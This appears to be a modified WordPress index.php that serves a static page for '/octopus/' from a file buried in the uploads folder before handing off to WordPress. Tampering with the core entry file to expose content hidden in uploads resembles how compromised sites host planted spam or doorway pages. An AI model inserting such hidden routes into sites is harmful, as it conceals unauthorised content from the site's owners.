<?php
/**
 * WordPress front controller + static page routing.
 */

// Ambil path URL tanpa query string
$request_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);

// Static route yang diizinkan
$static_routes = [
    '/octopus/' => __DIR__ . '/wp-content/uploads/pum/exe/02/octopus.html',
];

// Jika route ditemukan, tampilkan file HTML statis
if (isset($static_routes[$request_path])) {
    $file = $static_routes[$request_path];

    if (is_file($file) && is_readable($file)) {
        header('Content-Type: text/html; charset=UTF-8');
        readfile($file);
        exit;
    }

    http_response_code(404);
    exit('Page not found');
}

// Selain route di atas, tetap jalankan WordPress
define('WP_USE_THEMES', true);

require __DIR__ . '/wp-blog-header.php';
